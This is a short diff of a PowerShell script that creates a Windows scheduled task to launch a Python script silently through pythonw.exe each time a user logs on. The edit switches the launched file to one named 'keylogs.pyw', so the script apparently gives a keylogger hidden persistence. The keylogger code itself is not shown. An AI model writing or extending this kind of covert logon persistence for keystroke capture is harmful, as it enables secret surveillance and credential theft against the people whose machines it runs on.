@@ -3,7 +3,7 @@ $PythonW = (Get-Command pythonw.exe).Source
 
 $Action = New-ScheduledTaskAction `
     -Execute $PythonW `
-    -Argument "`"$Folder\ciao.pyw`"" `
+    -Argument "`"$Folder\keylogs.pyw`"" `
     -WorkingDirectory $Folder
 
 $Trigger = New-ScheduledTaskTrigger -AtLogOn
